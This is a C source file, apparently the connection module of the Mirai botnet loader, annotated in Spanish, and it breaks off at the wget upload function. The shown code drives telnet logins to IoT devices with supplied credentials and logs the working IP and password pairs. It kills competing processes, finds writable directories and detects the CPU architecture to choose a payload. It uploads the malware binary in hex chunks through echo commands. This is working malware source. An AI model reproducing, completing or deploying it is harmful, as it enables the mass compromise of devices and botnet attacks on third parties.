/**************************************************************************
 * Archivo: connection.c
 * 
 * Descripción: Implementación del manejo de conexiones para el loader de Mirai.
 * Este módulo gestiona las conexiones individuales con dispositivos objetivo,
 * implementando:
 * - Gestión del ciclo de vida de conexiones
 * - Procesamiento del protocolo Telnet
 * - Detección de arquitectura del sistema objetivo
 * - Carga y ejecución de payloads
 * - Limpieza y gestión de recursos
 * 
 * El código implementa una máquina de estados para manejar el proceso
 * completo de infección, desde la conexión inicial hasta la limpieza final.
 **************************************************************************/

/***************************************************************************
 * Inclusión de cabeceras estándar
 ***************************************************************************/
#include <sys/socket.h>  /* API de sockets */
#include <stdio.h>       /* Entrada/salida estándar */
#include <stdlib.h>      /* Funciones de utilidad general */
#include <string.h>      /* Manipulación de cadenas */
#include <time.h>        /* Funciones de tiempo */
#include <pthread.h>     /* Soporte para hilos */

/***************************************************************************
 * Inclusión de cabeceras del proyecto
 ***************************************************************************/
#include "headers/includes.h"     /* Definiciones comunes */
#include "headers/connection.h"   /* Estructuras y prototipos de conexión */
#include "headers/server.h"       /* Interfaz con el servidor */
#include "headers/binary.h"       /* Gestión de binarios */
#include "headers/util.h"         /* Funciones de utilidad */

/**
 * Inicializa una nueva conexión
 * 
 * Esta función prepara una estructura de conexión para su uso,
 * estableciendo valores iniciales seguros y configurando el estado
 * inicial de la máquina de estados Telnet.
 * 
 * La función es thread-safe, utilizando un mutex para proteger
 * el acceso concurrente a la estructura de conexión.
 * 
 * @param conn  Puntero a la estructura de conexión a inicializar
 */
void connection_open(struct connection *conn)
{
    /* Adquiere el mutex para acceso exclusivo */
    pthread_mutex_lock(&conn->lock);

    /* Inicialización de variables de estado */
    conn->rdbuf_pos = 0;              /* Posición inicial del buffer de lectura */
    conn->last_recv = time(NULL);     /* Timestamp del último dato recibido */
    conn->timeout = 10;               /* Timeout inicial de 10 segundos */
    conn->echo_load_pos = 0;          /* Posición inicial para carga por echo */
    conn->state_telnet = TELNET_CONNECTING; /* Estado inicial: conectando */
    conn->success = FALSE;            /* No hay éxito inicial */
    conn->open = TRUE;                /* Marca la conexión como abierta */
    conn->bin = NULL;                 /* Sin binario asignado inicialmente */
    conn->echo_load_pos = 0;          /* Reinicia posición de carga echo */

#ifdef DEBUG
    printf("[FD%d] Conexión inicializada\n", conn->fd);
#endif

    /* Libera el mutex */
    pthread_mutex_unlock(&conn->lock);
}

/**
 * Cierra una conexión y libera sus recursos
 * 
 * Esta función se encarga de:
 * 1. Limpiar buffers y estado de la conexión
 * 2. Registrar el resultado (éxito/fallo)
 * 3. Cerrar el socket asociado
 * 4. Actualizar estadísticas del servidor
 * 
 * La función es thread-safe y maneja la limpieza segura
 * de todos los recursos asociados a la conexión.
 * 
 * @param conn  Puntero a la estructura de conexión a cerrar
 */
void connection_close(struct connection *conn)
{
    /* Adquiere el mutex para acceso exclusivo */
    pthread_mutex_lock(&conn->lock);

    if (conn->open)
    {
#ifdef DEBUG
        printf("[FD%d] Cerrando conexión\n", conn->fd);
#endif
        /* Limpieza de buffers y estado */
        memset(conn->output_buffer.data, 0, sizeof(conn->output_buffer.data));
        conn->output_buffer.deadline = 0;    /* Reinicia deadline de salida */
        conn->last_recv = 0;                 /* Reinicia timestamp de recepción */
        conn->open = FALSE;                  /* Marca la conexión como cerrada */
        conn->retry_bin = FALSE;             /* Deshabilita reintentos de binario */
        conn->ctrlc_retry = FALSE;           /* Deshabilita reintentos de Ctrl+C */
        memset(conn->rdbuf, 0, sizeof(conn->rdbuf)); /* Limpia buffer de lectura */
        conn->rdbuf_pos = 0;                 /* Reinicia posición de lectura */

        /* Verificación de seguridad del servidor */
        if (conn->srv == NULL)
        {
            printf("Error: Servidor no inicializado\n");
            return;
        }

        /* 
         * Registro de resultados y actualización de estadísticas
         * Se registra el resultado en stderr con el formato:
         * OK|IP:PUERTO USUARIO:CONTRASEÑA ARQUITECTURA (para éxitos)
         * ERR|IP:PUERTO USUARIO:CONTRASEÑA ARQUITECTURA|ESTADO (para fallos)
         */
        if (conn->success)
        {
            /* Incrementa contador atómico de éxitos */
            ATOMIC_INC(&conn->srv->total_successes);
            /* Registra el éxito con detalles completos */
            fprintf(stderr, "OK|%d.%d.%d.%d:%d %s:%s %s\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, 
                (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch);
        }
        else
        {
            /* Incrementa contador atómico de fallos */
            ATOMIC_INC(&conn->srv->total_failures);
            /* Registra el fallo con estado telnet */
            fprintf(stderr, "ERR|%d.%d.%d.%d:%d %s:%s %s|%d\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, 
                (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch,
                conn->state_telnet);
        }
    }
    
    /* Establece estado final de la conexión */
    conn->state_telnet = TELNET_CLOSED;

    /* 
     * Cierra el socket y actualiza contadores
     * Solo si el descriptor es válido:
     * 1. Cierra el socket
     * 2. Marca el descriptor como inválido
     * 3. Decrementa el contador de conexiones abiertas
     */
    if (conn->fd != -1)
    {
        close(conn->fd);
        conn->fd = -1;
        ATOMIC_DEC(&conn->srv->curr_open);
    }

    /* Libera el mutex */
    pthread_mutex_unlock(&conn->lock);
}

/**
 * Procesa los comandos IAC (Interpret As Command) del protocolo Telnet
 * 
 * Esta función implementa el manejo del protocolo Telnet, procesando
 * las secuencias de negociación de opciones que comienzan con IAC (0xFF).
 * Maneja las siguientes negociaciones:
 * - WILL/WONT/DO/DONT para opciones específicas
 * - Negociación de terminal y opciones de pantalla
 * - Respuestas apropiadas según el RFC de Telnet
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Número de bytes procesados del buffer
 */
int connection_consume_iacs(struct connection *conn)
{
    int consumed = 0;              /* Contador de bytes procesados */
    uint8_t *ptr = conn->rdbuf;    /* Puntero al buffer de lectura */

    /* Procesa el buffer mientras haya datos disponibles */
    while (consumed < conn->rdbuf_pos)
    {
        int i;

        /* Busca marca IAC (0xFF) al inicio del comando */
        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            /* Verifica si hay suficientes bytes para procesar */
            if (!can_consume(conn, ptr, 1))
                break;

            /* Maneja IAC + IAC (0xFF 0xFF) - Escape para valor 0xFF */
            if (ptr[1] == 0xff)
            {
                ptr += 2;          /* Avanza el puntero */
                consumed += 2;     /* Actualiza bytes consumidos */
                continue;
            }
            /* Maneja IAC + DO (0xFF 0xFD) - Negociación de opciones */
            else if (ptr[1] == 0xfd)
            {
                /* Prepara respuestas para negociación de terminal
                 * tmp1: IAC WILL NAWS (Negociación de tamaño de ventana)
                 * tmp2: IAC SB NAWS 0 80 0 24 IAC SE (Define tamaño 80x24)
                 */
                uint8_t tmp1[3] = {255, 251, 31};  /* IAC WILL NAWS */
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                /* Verifica si hay suficientes bytes para la opción */
                if (!can_consume(conn, ptr, 2))
                    break;
                
                /* Si no es la opción NAWS (31), rechaza */
                if (ptr[2] != 31)
                    goto iac_wont;

                /* Procesa comando DO NAWS */
                ptr += 3;
                consumed += 3;

                /* Envía respuestas:
                 * 1. WILL NAWS - Acepta negociar tamaño de ventana
                 * 2. Define tamaño de ventana como 80x24
                 */
                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                /* Verifica bytes disponibles para respuesta */
                if (!can_consume(conn, ptr, 2))
                    break;

                /* 
                 * Convierte comandos recibidos en sus respuestas:
                 * - DO (0xFD) -> WONT (0xFC)
                 * - WILL (0xFB) -> DONT (0xFD)
                 * Esto efectivamente rechaza todas las otras opciones
                 */
                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)        /* DO -> WONT */
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)   /* WILL -> DONT */
                        ptr[i] = 0xfd;
                }

                /* Envía la respuesta negativa */
                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

/**
 * Busca y procesa el prompt de inicio de sesión
 * 
 * Esta función analiza el buffer de recepción buscando indicadores
 * de un prompt de login. Detecta dos tipos de prompts:
 * 1. Caracteres especiales típicos (: > $ # %)
 * 2. Palabras clave ("login", "enter")
 * 
 * La función es crucial para el proceso de autenticación ya que
 * determina cuándo es apropiado enviar el nombre de usuario.
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Posición del prompt en el buffer o 0 si no se encuentra
 */
int connection_consume_login_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    /* 
     * Busca caracteres especiales que indican un prompt
     * Caracteres buscados: : > $ # %
     * La búsqueda se hace desde el final para encontrar
     * el prompt más reciente
     */
    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || 
            conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || 
            conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("Prompt de login encontrado en pos %d, \"%c\", \"%s\"\n", 
                   i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    /* 
     * Si no se encontró un carácter especial,
     * busca palabras clave comunes en prompts de login:
     * - "ogin" (parte de "login")
     * - "enter"
     */
    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

/**
 * Detecta y procesa el prompt de contraseña
 * 
 * Similar a connection_consume_login_prompt, pero específicamente
 * busca indicadores de solicitud de contraseña. Detecta:
 * 1. Caracteres especiales de prompt
 * 2. La palabra "password"
 * 
 * Esta función es crucial para el timing correcto del envío
 * de credenciales durante el proceso de autenticación.
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Posición del prompt de contraseña o 0 si no se encuentra
 */
int connection_consume_password_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    /* 
     * Busca caracteres especiales de prompt
     * Realiza una búsqueda reversa para encontrar
     * el indicador más reciente
     */
    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || 
            conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || 
            conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("Prompt de contrasenia encontrado en pos %d, \"%c\", \"%s\"\n", 
                   i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    /* 
     * Si no se encontró un carácter especial,
     * busca la palabra "password" (usando "assword" para
     * mayor compatibilidad con diferentes variantes)
     */
    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    /* Retorna la posición encontrada o 0 si no se encontró nada */
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

/**
 * Detecta cualquier tipo de prompt del shell
 * 
 * Esta función busca cualquier carácter que típicamente indica
 * un prompt de shell en sistemas Unix/Linux. Es más genérica que
 * las funciones específicas de login/password, y se usa para
 * detectar cuando el sistema está listo para recibir comandos.
 * 
 * Caracteres reconocidos como prompt:
 * - ':' Típico en prompts de login/password
 * - '>' Usuario normal en algunos sistemas
 * - '$' Usuario normal en bash/sh
 * - '#' Usuario root
 * - '%' Usuario normal en csh/zsh
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Posición del prompt o 0 si no se encuentra
 */
int connection_consume_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    /* Busca caracteres de prompt desde el final del buffer */
    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || 
            conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || 
            conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("Prompt encontrado en pos %d, \"%c\", \"%s\"\n", 
                   i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    /* Retorna la posición del prompt o 0 si no se encontró */
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

/**
 * Verifica que el login fue exitoso
 * 
 * Esta función busca un token específico en la respuesta del sistema
 * que indica que se ha obtenido acceso exitoso. El token se usa
 * para distinguir entre un acceso real y posibles mensajes de error
 * o banners del sistema.
 * 
 * El proceso de verificación es crucial para:
 * 1. Confirmar acceso exitoso al sistema
 * 2. Asegurar que tenemos los privilegios necesarios
 * 3. Determinar si podemos proceder con la siguiente fase
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Posición del token de respuesta o 0 si no se encuentra
 */
int connection_consume_verify_login(struct connection *conn)
{
    /* Busca el token de respuesta que indica login exitoso */
    int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, 
                                     TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    /* Retorna la posición del token o 0 si no se encontró */
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

/**
 * Procesa la salida del comando 'ps' y maneja procesos del sistema
 * 
 * Esta función analiza la lista de procesos en ejecución y realiza
 * acciones específicas según los procesos encontrados:
 * 1. Elimina procesos init duplicados
 * 2. Identifica y termina procesos sospechosos
 * 3. Limpia procesos que podrían interferir con la operación
 * 
 * La función es crítica para:
 * - Asegurar control exclusivo del sistema
 * - Eliminar otros malware o procesos competidores
 * - Mantener la persistencia en el sistema
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset al final del procesamiento o 0 si no terminó
 */
int connection_consume_psoutput(struct connection *conn)
{
    int offset;                     /* Posición del token de respuesta */
    char *start = conn->rdbuf;      /* Inicio del buffer de lectura */
    int i, ii;                      /* Índices para iteración */

    /* Busca el fin de la salida del comando ps */
    offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, 
                          TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    /* Procesa cada línea de la salida del comando ps */
    for (i = 0; i < (offset == -1 ? conn->rdbuf_pos : offset); i++)
    {
        if (conn->rdbuf[i] == '\r')
            conn->rdbuf[i] = 0;
        else if (conn->rdbuf[i] == '\n')
        {
            uint8_t option_on = 0;
            BOOL last_character_was_space = FALSE;
            char *pid_str = NULL, *proc_name = NULL;

            conn->rdbuf[i] = 0;
            for (ii = 0; ii < ((char *)&conn->rdbuf[i] - start); ii++)
            {
                if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0)
                {
                    if (option_on > 0 && !last_character_was_space)
                        option_on++;
                    start[ii] = 0;
                    last_character_was_space = TRUE;
                }
                else
                {
                    if (option_on == 0)
                    {
                        pid_str = &start[ii];
                        option_on++;
                    }
                    else if (option_on >= 3 && option_on <= 5 && last_character_was_space)
                    {
                        proc_name = &start[ii];
                    }
                    last_character_was_space = FALSE;
                }
            }

            if (pid_str != NULL && proc_name != NULL)
            {
                int pid = atoi(pid_str);
                int len_proc_name = strlen(proc_name);

#ifdef DEBUG
                printf("pid: %d, proc_name: %s\n", pid, proc_name);
#endif

                if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0)) // Kill the second init
                    util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                else if (pid > 400)
                {
                    int num_count = 0;
                    int num_alphas = 0;

                    for (ii = 0; ii < len_proc_name; ii++)
                    {
                        if (proc_name[ii] >= '0' && proc_name[ii] <= '9')
                            num_count++;
                        else if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') || (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z'))
                        {
                            num_alphas++;
                            break;
                        }
                    }

                    if (num_alphas == 0 && num_count > 0)
                    {
                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
#ifdef DEBUG
                        printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
#endif
                        util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                    }
                }
            }

            start = conn->rdbuf + i + 1;
        }
    }

    if (offset == -1)
    {
        if (conn->rdbuf_pos > 7168)
        {
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
        return 0;
    }
    else
    {
        for (i = 0; i < conn->rdbuf_pos; i++)
        {
            if (conn->rdbuf[i] == 0)
                conn->rdbuf[i] = ' ';
        }
        return offset;
    }
}

/**
 * Procesa la salida del comando 'mount' y busca directorios escribibles
 * 
 * Esta función analiza la lista de sistemas de archivos montados para:
 * 1. Identificar particiones con permisos de escritura
 * 2. Encontrar directorios donde se pueden escribir archivos
 * 3. Verificar permisos mediante pruebas de escritura
 * 
 * El análisis es crucial para:
 * - Encontrar ubicaciones donde depositar el payload
 * - Asegurar persistencia en el sistema
 * - Evitar sistemas de archivos de solo lectura
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset al final del procesamiento o 0 si no terminó
 */
int connection_consume_mounts(struct connection *conn)
{
    char linebuf[256];             /* Buffer para procesar línea por línea */
    int linebuf_pos = 0;           /* Posición actual en el buffer de línea */
    int num_whitespaces = 0;       /* Contador de espacios para parseo */
    /* Busca el fin de la salida del comando mount */
    int i, prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, 
                                        TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (prompt_ending == -1)
        return 0;

    for (i = 0; i < prompt_ending; i++)
    {

        if (linebuf_pos == sizeof(linebuf) - 1)
        {
            // why are we here
            break;
        }

        if (conn->rdbuf[i] == '\n')
        {
            char *path, *mnt_info;

            linebuf[linebuf_pos++] = 0;

            strtok(linebuf, " "); // Skip name of partition
            if ((path = strtok(NULL, " ")) == NULL)
                goto dirs_end_line;
            if (strtok(NULL, " ") == NULL) // Skip type of partition
                goto dirs_end_line;
            if ((mnt_info = strtok(NULL, " ")) == NULL)
                goto dirs_end_line;

            if (path[strlen(path) - 1] == '/')
                path[strlen(path) - 1] = 0;

            if (util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1)
            {
                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n",
                                VERIFY_STRING_HEX, path, path, path, path, path);
            }

            dirs_end_line:
            linebuf_pos = 0;
        }
        else if (conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')
        {
            if (num_whitespaces++ == 0)
                linebuf[linebuf_pos++] = conn->rdbuf[i];
        }
        else if (conn->rdbuf[i] != '\r')
        {
            num_whitespaces = 0;
            linebuf[linebuf_pos++] = conn->rdbuf[i];
        }
    }

    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
                                VERIFY_STRING_HEX);

    util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
    return prompt_ending;
}

/**
 * Procesa y verifica los directorios con permisos de escritura
 * 
 * Esta función analiza las respuestas de las pruebas de escritura
 * realizadas en diferentes directorios y:
 * 1. Confirma los permisos de escritura efectivos
 * 2. Selecciona el primer directorio escribible válido
 * 3. Limpia archivos temporales de las pruebas
 * 
 * El proceso es importante para:
 * - Garantizar un lugar seguro para escribir el payload
 * - Evitar errores de permisos durante la infección
 * - Mantener el sistema limpio de archivos temporales
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Posición final del procesamiento o 0 si falló
 */
int connection_consume_written_dirs(struct connection *conn)
{
    int end_pos;                  /* Posición final del token de respuesta */
    int i, offset;               /* Variables para iteración y offsets */
    int total_offset = 0;        /* Offset acumulado en el procesamiento */
    BOOL found_writeable = FALSE; /* Indica si se encontró directorio válido */

    /* Busca el fin de la respuesta de verificación */
    if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, 
                                TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1)
        return 0;

    while (TRUE)
    {
        char *pch;
        int pch_len;

        offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
        if (offset == -1)
            break;
        total_offset += offset;

        pch = strtok(conn->rdbuf + total_offset, "\n");
        if (pch == NULL)
            continue;
        pch_len = strlen(pch);

        if (pch[pch_len - 1] == '\r')
            pch[pch_len - 1] = 0;

        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
        if (!found_writeable)
        {
            if (pch_len < 31)
            {
                strcpy(conn->info.writedir, pch);
                found_writeable = TRUE;
            }
            else
                connection_close(conn);
        }
    }

    return end_pos;
}

int connection_consume_copy_op(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;
    return offset;
}

/**
 * Detecta la arquitectura del sistema objetivo
 * 
 * Esta función analiza el encabezado ELF de los binarios en el
 * sistema objetivo para determinar su arquitectura. Es crucial para
 * seleccionar el payload correcto a cargar.
 * 
 * Soporta la detección de múltiples arquitecturas:
 * - ARM (incluyendo ARM64)
 * - MIPS (big y little endian)
 * - x86 (32 y 64 bits)
 * - SPARC
 * - Motorola 68k
 * - PowerPC
 * - SuperH
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset en el buffer donde termina la detección, o 0 si falla
 */
int connection_consume_arch(struct connection *conn)
{
    if (!conn->info.has_arch)
    {
        struct elf_hdr *ehdr;
        int elf_start_pos;

        /* Busca la firma ELF en el buffer */
        if ((elf_start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ELF", 3)) == -1)
            return 0;
        elf_start_pos -= 4;  /* Retrocede al inicio real del encabezado ELF */

        /* Convierte el buffer a estructura de encabezado ELF */
        ehdr = (struct elf_hdr *)(conn->rdbuf + elf_start_pos);
        conn->info.has_arch = TRUE;  /* Marca que ya tenemos información de arquitectura */

        /* 
         * Maneja el endianness del encabezado ELF
         * Asegura que los valores se interpreten correctamente
         * independientemente del endianness del sistema objetivo
         */
        switch (ehdr->e_ident[EI_DATA])
        {
            case EE_NONE:  /* Endianness inválido */
                return 0;
            case EE_BIG:   /* Big endian */
#ifdef LOADER_LITTLE_ENDIAN
                /* Si el loader es little endian pero el objetivo es big endian,
                   convierte el campo e_machine a big endian */
                ehdr->e_machine = htons(ehdr->e_machine);
#endif
                break;
            case EE_LITTLE:  /* Little endian */
#ifdef LOADER_BIG_ENDIAN
                /* Si el loader es big endian pero el objetivo es little endian,
                   convierte el campo e_machine a little endian */
                ehdr->e_machine = htons(ehdr->e_machine);
#endif
                break;
        }

        /* 
         * Identifica la arquitectura basándose en el campo e_machine
         * del encabezado ELF. Soporta las siguientes arquitecturas:
         * - ARM (32/64 bits)
         * - MIPS (big/little endian)
         * - x86 (32/64 bits)
         * - SPARC (todas las variantes)
         * - M68K/88K
         * - PowerPC (32/64 bits)
         * - SuperH
         */
        if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
            strcpy(conn->info.arch, "arm");    /* ARM y ARM64 */
        else if (ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
        {
            /* MIPS - Distingue entre big y little endian */
            if (ehdr->e_ident[EI_DATA] == EE_LITTLE)
                strcpy(conn->info.arch, "mpsl"); /* MIPS little endian */
            else
                strcpy(conn->info.arch, "mips"); /* MIPS big endian */
        }
        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || 
                 ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
            strcpy(conn->info.arch, "x86");     /* Todas las variantes x86 */
        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || 
                 ehdr->e_machine == EM_SPARCV9)
            strcpy(conn->info.arch, "spc");     /* Todas las variantes SPARC */
        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
            strcpy(conn->info.arch, "m68k");    /* Motorola 68k y 88k */
        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
            strcpy(conn->info.arch, "ppc");     /* PowerPC 32/64 bits */
        else if (ehdr->e_machine == EM_SH)
            strcpy(conn->info.arch, "sh4");     /* SuperH */
        else
        {
            /* Arquitectura no soportada */
            conn->info.arch[0] = 0;            /* Marca como desconocida */
            connection_close(conn);            /* Cierra la conexión */
        }
    }
    else
    {
        int offset;

        if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1)
            return offset;
        if (conn->rdbuf_pos > 7168)
        {
            // Hack drain buffer
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
    }

    return 0;
}

/**
 * Determina el subtipo específico de arquitectura ARM
 * 
 * Esta función analiza la información detallada del procesador
 * para identificar versiones específicas de ARM (v6/v7).
 * Es crucial para:
 * - Seleccionar el binario óptimo para la arquitectura
 * - Asegurar compatibilidad de instrucciones
 * - Maximizar el rendimiento del payload
 * 
 * La detección se centra en ARMv6 y ARMv7, que son comunes
 * en dispositivos IoT y sistemas embebidos.
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset al token de respuesta o 0 si no se encuentra
 */
int connection_consume_arm_subtype(struct connection *conn)
{
    /* Busca el fin de la salida del comando */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, 
                              TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    /* 
     * Busca indicadores de versión ARMv6 o ARMv7
     * Estos son los tipos más comunes en dispositivos IoT
     */
    if (util_memsearch(conn->rdbuf, offset, "ARMv7", 5) != -1 || 
        util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
#ifdef DEBUG
        printf("[FD%d] Arquitectura detectada: ARMv7\n", conn->fd);
#endif
        strcpy(conn->info.arch, "arm7");  /* Marca como ARMv7 para payload específico */
    }

    return offset;
}

/**
 * Determina los métodos de carga disponibles en el sistema objetivo
 * 
 * Esta función analiza la disponibilidad de diferentes herramientas
 * de transferencia de archivos en el sistema y selecciona el mejor
 * método para cargar el payload. La prioridad es:
 * 1. wget - Más confiable y versátil
 * 2. tftp - Común en dispositivos embebidos
 * 3. echo - Método de respaldo, más lento pero siempre disponible
 * 
 * La selección del método adecuado es crucial para:
 * - Maximizar la probabilidad de éxito en la carga
 * - Optimizar la velocidad de transferencia
 * - Adaptarse a las limitaciones del sistema
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset al token de respuesta o 0 si no se encuentra
 */
int connection_consume_upload_methods(struct connection *conn)
{
    /* Busca el fin de la respuesta de verificación */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, 
                              TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    /* Determina el mejor método disponible:
     * - Si wget está disponible (no hay mensaje "not found"), úsalo
     * - Si tftp está disponible, úsalo como segunda opción
     * - Si ninguno está disponible, usa echo como último recurso
     */
    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_WGET;     /* wget disponible */
    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_TFTP;     /* tftp disponible */
    else
        conn->info.upload_method = UPLOAD_ECHO;     /* usa echo como respaldo */

    return offset;
}

/**
 * Implementa el método de carga mediante el comando 'echo'
 * 
 * Esta función implementa la carga del payload utilizando el comando
 * echo como método alternativo cuando wget y tftp no están disponibles.
 * El proceso incluye:
 * 1. Decodificación y transferencia del payload en chunks hexadecimales
 * 2. Reconstrucción del binario en el sistema objetivo
 * 3. Verificación de cada fragmento transferido
 * 
 * Características importantes:
 * - Usa echo -ne para interpretar secuencias de escape
 * - Concatena fragmentos usando >> para archivos grandes
 * - Mantiene un control de posición para múltiples fragmentos
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      0 si necesita continuar, offset si completó
 */
int connection_upload_echo(struct connection *conn)
{
    /* Busca el token de respuesta que indica éxito de la operación */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    /* Verifica que el binario está inicializado */
    if (conn->bin == NULL)
    {
        connection_close(conn);
        return 0;
    }
    
    /* Verifica si ya se han enviado todos los fragmentos */
    if (conn->echo_load_pos == conn->bin->hex_payloads_len)
        return offset;

    /* Envía el siguiente fragmento del payload usando echo
     * - Usa > para el primer fragmento (crear archivo)
     * - Usa >> para los siguientes (concatenar)
     */
    util_sockprintf(conn->fd, "echo -ne '%s' %s " FN_DROPPER "; " TOKEN_QUERY "\r\n",
                    conn->bin->hex_payloads[conn->echo_load_pos], 
                    (conn->echo_load_pos == 0) ? ">" : ">>");
    conn->echo_load_pos++;

    /* Limpia el buffer moviendo el contenido no procesado al inicio */
    memmove(conn->rdbuf, conn->rdbuf + offset, conn->rdbuf_pos - offset);
    conn->rdbuf_pos -= offset;

    return 0;
}

/**
 * Implementa el método de carga mediante wget
 * 
